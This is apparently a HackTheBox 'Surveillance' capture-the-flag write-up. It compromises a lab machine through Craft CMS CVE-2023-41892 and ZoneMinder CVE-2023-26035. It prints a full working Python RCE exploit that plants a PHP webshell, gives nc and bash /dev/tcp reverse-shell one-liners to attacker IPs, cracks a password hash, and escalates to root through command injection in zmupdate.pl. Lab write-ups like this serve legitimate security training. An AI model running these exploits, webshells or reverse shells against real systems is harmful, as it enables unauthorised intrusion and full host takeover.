---
title: Exploitation of Craft CMS Vulnerabilities (CVE-2023-41892)
description: HackTheBox - Surveillance Writeup
date: 2024-05-28 00:34:00 +0800
categories: [Writeup, hackthebox]
tags: [Craft CMS]
image: https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/bg.jpg?raw=true
---

## INFORMATION GHATERING

### Nmap

Scan IP Address by using `nmap`

```terminal
nmap -p- -sV -sC --min-rate 1000 10.10.11.245
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-27%20102548.png?raw=true)

Nmap result:

- Port 22 is open (SSH)
- Port 80 is open (http)

Add the machine’s IP address to the `/etc/hosts`

```terminal
echo "10.10.11.245 surveillance.htb" >> /etc/hosts
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-27%20102942.png?raw=true)

After updating the `/etc/hosts` file to map the machine's IP address to the hostname, I was able to access the web application successfully by entering the hostname in my browser. This confirmed that the hostname resolution was functioning correctly, allowing seamless interaction with the target service.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-27%20103022.png?raw=true)

The next step in my methodology involves conducting passive reconnaissance. I utilize tools such as the Wappalyzer extension, which frequently provides valuable information about the technologies used by the target website. This information can be crucial in identifying potential vulnerabilities and understanding the overall structure of the web application.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20024926.png?raw=true)

### Dirsearch

To identify hidden directories on the target web server, I employ Dirsearch, a robust directory brute-forcing tool.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-27%20105016.png?raw=true)
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-27%20105057.png?raw=true)

The Dirsearch scan revealed an accessible administrative login page at `http://surveillance.htb/admin/login`.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-27%20105158.png?raw=true)

Upon inspecting the source code of `index.php`, I identified the specific version of Craft CMS in use.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20030509.png?raw=true)

## EXPLOITATION

After conducting a research, I discovered that Craft CMS version 4.4.14 is vulnerable to a critical remote code execution (RCE) vulnerability, identified as [**CVE-2023-41892**](https://www.exploit-db.com/exploits/51918)

```python
#!/usr/bin/env python3
#coding: utf-8

# Exploit Title: Craft CMS unauthenticated Remote Code Execution (RCE)
# Date: 2023-12-26
# Version: 4.0.0-RC1 - 4.4.14
# Vendor Homepage: https://craftcms.com/
# Software Link: https://github.com/craftcms/cms/releases/tag/4.4.14
# Tested on: Ubuntu 22.04.3 LTS
# Tested on: Craft CMS 4.4.14
# Exploit Author: Olivier Lasne
# CVE : CVE-2023-41892
# References :
# https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
# https://blog.calif.io/p/craftcms-rce

import requests
import sys, re

if(len(sys.argv) < 2):
    print(f"\033[1;96mUsage:\033[0m python {sys.argv[0]} \033[1;96m<url>\033[0m")
    exit()

HOST = sys.argv[1]

if not re.match('^https?://.*', HOST):
    print("\033[1;31m[-]\033[0m URL should start with http or https")
    exit()

print("\033[1;96m[+]\033[0m Executing phpinfo to extract some config infos")

## Execute phpinfo() and extract config info from the website
url = HOST + '/index.php'
content_type = {'Content-Type': 'application/x-www-form-urlencoded'}

data = r'action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}'

try:
    r = requests.post(url, headers=content_type, data=data)
except:
    print(f"\033[1;31m[-]\033[0m Could not connect to {HOST}")
    exit()

# If we succeed, we should have default phpinfo credits 
if not 'PHP Group' in r.text:
	print(f'\033[1;31m[-]\033[0m {HOST} is not exploitable.')
	exit()


# Extract config value for tmp_dir and document_root
pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'

tmp_dir       = re.search(pattern1, r.text, re.DOTALL).group(1)
document_root = re.search(pattern2, r.text, re.DOTALL).group(1)


if 'no value' in tmp_dir:
	tmp_dir = '/tmp'

print(f'temporary directory: {tmp_dir}')
print(f'web server root: {document_root}')

## Create shell.php in tmp_dir

data = {
    "action": "conditions/render",
    "configObject[class]": "craft\elements\conditions\ElementCondition",
    "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
}

files = {
    "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
    <image>
    <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
    <write filename="info:DOCUMENTROOT/shell.php"/>
    </image>""".replace("DOCUMENTROOT", document_root), "text/plain")
}

print(f'\033[1;96m[+]\033[0m create shell.php in {tmp_dir}')
r = requests.post(url, data=data, files=files) #, proxies={'http' : 'http://127.0.0.1:8080'}) #  


# Use the Imagick trick to move the webshell in DOCUMENT_ROOT

data = {
    "action": "conditions/render",
    "configObject[class]": r"craft\elements\conditions\ElementCondition",
    "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmp_dir + r'/php*"}}}'
}

print(f'\033[1;96m[+]\033[0m trick imagick to move shell.php in {document_root}')
r = requests.post(url, data=data) #, proxies={"http": "http://127.0.0.1:8080"})

if r.status_code != 502:
    print("\033[1;31m[-]\033[0m Exploit failed")
    exit()

print(f"\n\033[1;95m[+]\033[0m Webshell is deployed: {HOST}/\033[1mshell.php\033[0m?cmd=whoami")
print(f"\033[1;95m[+]\033[0m Remember to \033[1mdelete shell.php\033[0m in \033[1m{document_root}\033[0m when you're done\n")
print("\033[1;92m[!]\033[0m Enjoy your shell\n")

url = HOST + '/shell.php'

## Pseudo Shell
while True:
    command = input('\033[1;96m>\033[0m ')
    if command == 'exit':
        exit()

    if command == 'clear' or command == 'cls':
        print('\n' * 100)
        print('\033[H\033[3J', end='')
        continue

    data = {'cmd' : command}
    r = requests.post(url, data=data) #, proxies={"http": "http://127.0.0.1:8080"})

    # exit if we have an error
    if r.status_code != 200:
        print(f"Error: status code {r.status_code} for {url}")
        exit()

    res_command = r.text
    res_command = re.sub('^caption:', '', res_command)
    res_command = re.sub(' CAPTION.*$', '', res_command)

    print(res_command, end='')
```

Next, download the payload from GitHub and execute the exploit script as follows:

```terminal
sudo git clone https://github.com/Faelian/CraftCMS_CVE-2023-41892
cd CraftCMS_CVE-2023-41892
python3 craft-cms.py http://surveillance.htb/
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20034201.png?raw=true)

I attempted to execute some commands, but they were ineffective. Therefore, I decided to establish a reverse shell to my machine for better control and interaction.

Attack machine:
```terminal
nc -lvnp 4444
```

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20035336.png?raw=true)


Target machines:
```terminal
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f
```

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20035325.png?raw=true)

Upgrade shell:
```terminal
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
I identified two usernames on the system: `matthew` and `zoneminder`. Attempts to switch to these users prompted for passwords, which I did not have. Unsure of the next step, I decided to leverage LinPEAS to conduct a thorough enumeration and uncover any useful information for privilege escalation.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20040201.png?raw=true)

### Linpeas

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20041305.png?raw=true)

From the LinPEAS results, I discovered several interesting files and pieces of information that could be valuable for further exploitation.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20041559.png?raw=true)

I attempted to access the file located at `/var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql` and I found password hash for user matthew.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20042909.png?raw=true)

### John the Ripper

To crack the password, I will use John the Ripper. However, before that, I need to identify the hash type using `hashid`

```terminal
hashid '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec'
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20043439.png?raw=true)

```terminal
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 hash.txt
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20044232.png?raw=true)

### SSH
After obtaining the password, I will try to SSH using all the credentials I have gathered.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20073549.png?raw=true)

## PRIVELEGE ESCALATION

To gain root access, I ran Linpeas again and discovered some active ports that were very interesting.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20074406.png?raw=true)

To access this port, I need to do an SSH Tunelling also known as SSH port forwarding. A method used to create a secure connection between a local and a remote machine through an encrypted SSH (Secure Shell) session. This technique allows you to securely transmit data over a network, especially when you need to access services on a remote network that are not directly accessible due to firewalls or other network restrictions.
Example commands for local port forwarding:

```terminal
ssh -L local_port:destination_server:remote_port username@ssh_server
```

On target machine:

```terminal
ssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20080430.png?raw=true)

After successfully logging in, I visited my localhost IP on port 22 and observed that it displayed a ZoneMinder login page.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20080446.png?raw=true)

I googled for available exploits for ZoneMinder and came across another RCE-related exploit. Download the script from this github [**CVE-2023-26035**](https://github.com/rvizx/CVE-2023-26035).

Run this command on local machines:

```terminal
python3 exploit.py -t http://127.0.0.1:2222 -ip 10.10.11.245 -p 1234
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20081909.png?raw=true)

Open nc listener on target machines.

```terminal
nc -lvnp 1234
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20081920.png?raw=true)

- Check for privelege on permissions

```terminal
sudo -l
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20083205.png?raw=true)


- In /usr/bin there are scripts that are part of ZoneMinder

```terminal
ls -l /usr/bin/zm*
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20090551.png?raw=true)

- Try to run zmupdate.pl

```terminal
sudo zmupdate.pl --user='$(touch /tmp/test)'
```

- Check the file was created, with root permissions

```terminal
ls -l /tmp
```

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20090626.png?raw=true)


- Attempt to open a new shell

```terminal
sudo /usr/bin/zmupdate.pl --version 1 --user='$(/bin/bash)'
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20090657.png?raw=true)

- Reverse shell

```terminal
nc -lvnp 123
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20090717.png?raw=true)

- Run the reverse shell from the target computer

```terminal
bash -i >& /dev/tcp/10.10.14.77/4444 0>&1
```
- Whoami?











